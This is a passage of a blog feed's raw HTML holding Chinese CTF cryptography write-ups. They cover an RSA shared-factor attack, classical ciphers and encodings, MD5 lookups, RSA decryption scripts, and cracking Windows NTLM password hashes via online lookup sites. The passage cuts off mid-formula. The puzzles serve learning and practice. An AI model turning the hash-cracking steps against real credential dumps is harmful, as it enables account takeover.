class="number">26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659</span></span><br><span class="line">c20 = <span class="number">386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[n1,n2,n3,n4,n5,n6,n7,n8,n9,n10,n11,n12,n13,n14,n15,n16,n17,n18,n19,n20]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">        <span class="keyword">if</span> i==j:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(i,j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(gmpy2.gcd(<span class="built_in">list</span>[i],<span class="built_in">list</span>[j]))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;error &quot;</span>,i)</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>透過因數分解拆拆看能不能拆出共同質因數p</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499</span><br></pre></td></tr></table></figure><p>拆出來之後就可以靠p, q來計算d，有了d之後可以進行解密動作。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p = <span class="number">132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499</span></span><br><span class="line">q = n18 // p</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c18,d,n18)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><p>拿到flag，舒服。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF crypto 1</title>
      <link href="/ctf-crypto-buuctf-1/"/>
      <url>/ctf-crypto-buuctf-1/</url>
      
        <content type="html"><![CDATA[<p>感覺CTF題目寫過就忘記，真的要把題解好好寫下來，之後要用到的時候直接查詢就好。<br />記憶力有點靠不住了，然後這邊只會提供做法，盡量不提供flag，不好意思。</p><h2 id="buuctf"><a class="markdownIt-Anchor" href="#buuctf"></a> BUUCTF</h2><p>因為感覺比較油一點就來試試看。</p><h3 id="md5"><a class="markdownIt-Anchor" href="#md5"></a> MD5</h3><p>這題給出e00cf25ad42683b3df678c61f42c6bda這個字串，依據題目來看就是MD5解密。</p><blockquote><p>MD5訊息摘要演算法（MD5 Message-Digest Algorithm），是一種被廣泛使用的密碼雜湊函式，可以產生出一個128位元（16個字元(BYTES)）的雜湊值（hash value），用於確保資訊傳輸完整一致，由美國密碼學家羅納德·李維斯特（Ronald Linn Rivest）設計。</p></blockquote><p>網站提供的是與資料庫內的數據進行比較並解密，畢竟不可能從hash中直接獲得明文。</p><p><a href="https://md5decrypt.net/en/">https://md5decrypt.net/en/</a></p><p>輸入後即可取得flag。</p><h3 id="一眼就解密"><a class="markdownIt-Anchor" href="#一眼就解密"></a> 一眼就解密</h3><p>題目給出的加密字串是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30=</span><br></pre></td></tr></table></figure><p>看到字尾有=可以先盲猜是base64，熟到不能再熟了。<br />decode base64 to ascii編碼之後，得到flag。</p><h3 id="url編碼"><a class="markdownIt-Anchor" href="#url編碼"></a> Url編碼</h3><p>既然提示出是url編碼了，就找一個解url編碼的網站。</p><p><a href="https://www.ifreesite.com/urldecoderencoder.htm">https://www.ifreesite.com/urldecoderencoder.htm</a></p><p>解碼後取得flag。</p><h3 id="看我迴旋踢"><a class="markdownIt-Anchor" href="#看我迴旋踢"></a> 看我迴旋踢</h3><p>題目給出的加密字串是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;</span><br></pre></td></tr></table></figure><p>感覺沒什麼特別的地方，也不是hex等字串的感覺，先盲猜ROT13，然後發現解密出的字串格式是flag{…}，確定取得flag。</p><h3 id="摩絲"><a class="markdownIt-Anchor" href="#摩絲"></a> 摩絲</h3><p>厲害了，直接打開維基百科查詢，對密碼對到眼睛瞎掉。<br />不過比較好的是密碼中間有用空格隔開，不然真的很噁。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.. .-.. --- ...- . -.-- --- ..-</span><br></pre></td></tr></table></figure><p>翻譯過來是I LOVE YOU，提交還要大寫，不要臉。</p><h3 id="password"><a class="markdownIt-Anchor" href="#password"></a> password</h3><p>原本又HxD等等軟體都打不開，想說這到底是什麼，沒想到notepad++直接打開，使用字元集GB2312來進行解碼之後可以觀看。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">姓名：张三 </span><br><span class="line">生日：19900315</span><br><span class="line"></span><br><span class="line">key格式为key&#123;xxxxxxxxxx&#125;</span><br></pre></td></tr></table></figure><p>要填入十個數字，猜測應該是姓名加上生日，但沒想到是縮寫，厲害了羅馬拼音。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;zs19900315&#125;</span><br></pre></td></tr></table></figure><h3 id="變異凱撒"><a class="markdownIt-Anchor" href="#變異凱撒"></a> 變異凱撒</h3><p>原本以為就是ROT13的變形，結果沒想到列出所有組合都怪怪的，然後去找了一下^，確認他在ASCII裡面。</p><p>然後可以看到一些規律。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a+5=f</span><br><span class="line">f+6=l</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>然後直接解碼就好，取得flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar</span>(<span class="params">cipher</span>):</span><br><span class="line">    j = <span class="number">5</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i) + j), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">caesar(<span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="quoted-printable"><a class="markdownIt-Anchor" href="#quoted-printable"></a> Quoted-printable</h3><p>題目給的密文是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6</span><br></pre></td></tr></table></figure><p>先查詢Quoted-printable是什麼東西，發現維基百科的定義如下。</p><blockquote><p>Quoted-printable或QP encoding，沒有規範的中文譯名，可譯為可列印字元參照編碼或使用可列印字元的編碼。Quoted-printable是使用可列印的ASCII字元（如字母、數字與「=」）表示各種編碼格式下的字元，以便能在7-bit資料通路上傳輸8-bit資料, 或者更一般地說在非8-bit clean媒體上正確處理資料。這被定義為MIME content transfer encoding，用於e-mail。</p></blockquote><p>以此網站進行decoder即可取得flag內容。</p><p><a href="https://www.webatic.com/quoted-printable-convertor">https://www.webatic.com/quoted-printable-convertor</a></p><h3 id="rabbit"><a class="markdownIt-Anchor" href="#rabbit"></a> Rabbit</h3><p>題目給的密文是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI</span><br></pre></td></tr></table></figure><p>先查詢Rabbit密碼是什麼東西，網路上的資訊如下。</p><blockquote><p>Rabbit流密碼是由Cryptico公司（<a href="http://www.cryptico.com">http://www.cryptico.com</a> ）設計的，金鑰長度128位，<br />最大加密訊息長度為264 Bytes，即16 TB，若訊息超過該長度，則需要更換金鑰對剩下的訊息進行處理。它是目前安全性較高，加/解密速度比較高效的流密碼之一，在各種處理器平臺上都有不凡的表現。</p></blockquote><p><a href="http://tools.jb51.net/password/rabbit_encode">http://tools.jb51.net/password/rabbit_encode</a></p><p>使用此網站進行解碼即可取得flag。</p><h3 id="籬笆牆的影子"><a class="markdownIt-Anchor" href="#籬笆牆的影子"></a> 籬笆牆的影子</h3><p>題目給的密文是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">felhaagv&#123;ewtehtehfilnakgw&#125;</span><br></pre></td></tr></table></figure><p>題目給出的題示是 :<br />星星還是那顆星星喲<br />月亮還是那個月亮<br />山也還是那座山喲<br />梁也還是那道梁<br />碾子是碾子缸是缸喲<br />爹是爹來娘是娘<br />麻油燈呵還吱吱響<br />點的還是那麼丁點亮<br />哦哦</p><p>完全…看不懂，查詢之後發現是歌詞。</p><p>哭阿，方向完全錯了，這是柵欄密碼。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">felhaagv&#123;ewtehtehfilnakgw&#125;</span><br><span class="line">f l a g &#123; w e t h i n k w</span><br><span class="line"> e h a v e t h e f l a g &#125;</span><br></pre></td></tr></table></figure><p>於是可以用這種簡單的方法解出flag{wethinkwehavetheflag}</p><p>爛死了。</p><h3 id="丟失的md5"><a class="markdownIt-Anchor" href="#丟失的md5"></a> 丟失的MD5</h3><p>題目給出一個py檔。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib   </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            m=hashlib.md5()</span><br><span class="line">            m.update(<span class="string">&#x27;TASC&#x27;</span>+<span class="built_in">chr</span>(i)+<span class="string">&#x27;O3RJMV&#x27;</span>+<span class="built_in">chr</span>(j)+<span class="string">&#x27;WDJKX&#x27;</span>+<span class="built_in">chr</span>(k)+<span class="string">&#x27;ZM&#x27;</span>)</span><br><span class="line">            des=m.hexdigest()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;e9032&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;da&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;911513&#x27;</span> <span class="keyword">in</span> des:</span><br><span class="line">                <span class="built_in">print</span>(des)</span><br></pre></td></tr></table></figure><p>嘗試運行後發現被提示需要編碼，修正後讓他可以運行。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib   </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            m=hashlib.md5()</span><br><span class="line">            m.update(<span class="built_in">str</span>(<span class="string">&#x27;TASC&#x27;</span>+<span class="built_in">chr</span>(i)+<span class="string">&#x27;O3RJMV&#x27;</span>+<span class="built_in">chr</span>(j)+<span class="string">&#x27;WDJKX&#x27;</span>+<span class="built_in">chr</span>(k)+<span class="string">&#x27;ZM&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            des=m.hexdigest()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;e9032&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;da&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;911513&#x27;</span> <span class="keyword">in</span> des:</span><br><span class="line">                <span class="built_in">print</span>(des)</span><br></pre></td></tr></table></figure><p>執行後獲得</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e9032994dabac08080091151380478a2</span><br></pre></td></tr></table></figure><p>感覺是hex(十六進位)，但丟進去decoder成ascii和base64都不太對的感覺。<br />然後發現自己是笨蛋，題目就說他是MD5，啊我怎麼沒感覺。</p><p>最後發現這就是答案了，哭阿哭阿，我是笨蛋。</p><h3 id="rsa"><a class="markdownIt-Anchor" href="#rsa"></a> RSA</h3><p>p=473398607161，q=4511491，e=17，求解 d</p><p>使用公式解就可以了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p =gmpy2.mpz(<span class="number">473398607161</span>)</span><br><span class="line">q =gmpy2.mpz(<span class="number">4511491</span>)</span><br><span class="line">e =gmpy2.mpz(<span class="number">17</span>)</span><br><span class="line">phi_n= (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d is:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (d)</span><br></pre></td></tr></table></figure><p>拿到flag</p><h3 id="alice與bob"><a class="markdownIt-Anchor" href="#alice與bob"></a> Alice與Bob</h3><p>密碼學歷史中，有兩位知名的傑出人物，Alice和Bob。他們的愛情經過置換和輪加密也難以混淆，即使是沒有身份認證也可以知根知底。就像在數學王國中的素數一樣，孤傲又熱情。下面是一個大整數:98554799767,請分解為兩個素數，分解後，小的放前面，大的放後面，合成一個新的數字，進行md5的32位小寫哈希，提交答案。</p><p>整數n小於256bit，可以透過本地工具爆破成功，直接打開RSATool2v17。</p><p>不然也可以使用線上工具 <a href="http://factordb.com/">http://factordb.com/</a> 查詢。</p><p>爆破結果p = 101999, q = 966233</p><p>以 101999966233 在 <a href="http://www.hiencode.com/hash.html">http://www.hiencode.com/hash.html</a> 這類線上工具進行MD5的hash計算，得到flag。</p><h3 id="rsarsa"><a class="markdownIt-Anchor" href="#rsarsa"></a> rsarsa</h3><p>題目:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm.</span><br><span class="line"></span><br><span class="line">p =  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q =  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">e =  65537</span><br><span class="line">c =  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br><span class="line"></span><br><span class="line">Use RSA to find the secret message</span><br></pre></td></tr></table></figure><p>利用RSATool2v17計算出d</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d = 56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p =  <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q =  <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">c =  <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">d = <span class="number">56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977</span></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(c, d, n))</span><br></pre></td></tr></table></figure><p>得到flag。</p><h3 id="大帝的密碼武器"><a class="markdownIt-Anchor" href="#大帝的密碼武器"></a> 大帝的密碼武器</h3><p>看到大帝直覺又是凱薩密碼，</p><p>用HxD打開，看到開頭兩個字是PK，應該是zip的標示，加上副檔名.zip之後解壓縮，得到題目。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">公元前一百年，在罗马出生了一位对世界影响巨大的人物，他生前是罗马三巨头之一。他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。</span><br><span class="line">以下密文被解开后可以获得一个有意义的单词：FRPHEVGL</span><br><span class="line">你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交。</span><br></pre></td></tr></table></figure><p>將FRPHEVGL跑25種ROT之後可以得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FRPHEVGL</span><br><span class="line">GSQIFWHM</span><br><span class="line">HTRJGXIN</span><br><span class="line">IUSKHYJO</span><br><span class="line">JVTLIZKP</span><br><span class="line">KWUMJALQ</span><br><span class="line">LXVNKBMR</span><br><span class="line">MYWOLCNS</span><br><span class="line">NZXPMDOT</span><br><span class="line">OAYQNEPU</span><br><span class="line">PBZROFQV</span><br><span class="line">QCASPGRW</span><br><span class="line">RDBTQHSX</span><br><span class="line">SECURITY</span><br><span class="line">TFDVSJUZ</span><br><span class="line">UGEWTKVA</span><br><span class="line">VHFXULWB</span><br><span class="line">WIGYVMXC</span><br><span class="line">XJHZWNYD</span><br><span class="line">YKIAXOZE</span><br><span class="line">ZLJBYPAF</span><br><span class="line">AMKCZQBG</span><br><span class="line">BNLDARCH</span><br><span class="line">COMEBSDI</span><br><span class="line">DPNFCTEJ</span><br></pre></td></tr></table></figure><p>懶得看哪個是有意義的單詞，直接丟Google翻譯，得到單詞是SECURITY，順便確定只是簡單的ROT13。<br />然後沒找到要加密的密文在哪，後來發現SECURITY也不是密文 = =，查了一下發現大家還會拿到一個密文叫ComeChina，題目感覺出了問題，丟進ROT13，得到flag。</p><h3 id="windows系統密碼"><a class="markdownIt-Anchor" href="#windows系統密碼"></a> Windows系統密碼</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">ctf:1002:06af9108f2e1fecf144e2e8adef09efd:a7fcb22a88038f35a8f39d503e7f0062:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:bef14eee40dffbc345eeb3f58e290d56:::</span><br></pre></td></tr></table></figure><p>從 <a href="https://www.secpulse.com/archives/65256.html">https://www.secpulse.com/archives/65256.html</a> 此篇文章可以看出windows有兩種密碼處理方式，其中NT LAN Manager（NTLM）的格式跟題目給出的格式一樣。</p><p>將06af9108f2e1fecf144e2e8adef09efd和a7fcb22a88038f35a8f39d503e7f0062分別丟入 <a href="https://www.cmd5.com/">https://www.cmd5.com/</a> 後，後者可以得到有意義的flag。</p><h3 id="凱撒替換呵呵"><a class="markdownIt-Anchor" href="#凱撒替換呵呵"></a> 凱撒？替換？呵呵!</h3><p>題目給的密文如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MTHJ&#123;CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125; </span><br></pre></td></tr></table></figure><p>先跑過一遍凱薩密碼，感覺都不像，就改用替換密碼爆破。</p><p>在 <a href="https://quipqiup.com/">https://quipqiup.com/</a> 上輸入密文和已知替換字 MTHJ=flag ，暴力破解後的第一個選項就是flag。</p><h3 id="萌萌噠的八戒"><a class="markdownIt-Anchor" href="#萌萌噠的八戒"></a> 萌萌噠的八戒</h3><p>題目無法解壓縮，用notepad++打開來看，發現是rar，改用rar解壓縮取得題目。</p><p><img src="https://raw.githubusercontent.com/afan0918/afan0918.github.io/main/asset/bajie.jpg" alt="" /></p><p>先看檔案內有沒有flag和隱藏的區塊，檢查之後找不到，圖片左下感覺是密碼。</p><p><a href="http://www.hiencode.com/pigpen.html">http://www.hiencode.com/pigpen.html</a></p><p>照著輸入，取得密碼。</p><h3 id="rsa1"><a class="markdownIt-Anchor" href="#rsa1"></a> RSA1</h3><p>題目給出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 </span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 </span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 </span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 </span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br></pre></td></tr></table></figure><p>參照 <a href="https://crypto.stackexchange.com/questions/19413/what-are-dp-and-dq-in-encryption-by-rsa-in-c">此論壇</a>，得知DP is d mod (p − 1), similarly DQ is d mod (q − 1).</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mspace linebreak="newline"></mspace><mi>m</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mspace linebreak="newline"></mspace><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>d</mi><mi>p</mi><mo>=</mo><mi>d</mi><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>d</mi><mi>q</mi><mo>=</mo><mi>d</mi><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c = m^e mod n\newlinem = c^d mod n\newlineϕ(n) = (p-1) * (q-1)\newlinedp = d mod (p-1)\newlinedq = d mod (q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">ϕ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p><p>要解密求出明文m，要先拿到 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>c</mi><mi>d</mi></msup></mrow><annotation encoding="application/x-tex">c^d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.849108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span></span></span></span>，利用中國剩餘定理，可以得到<span class="katex"><span 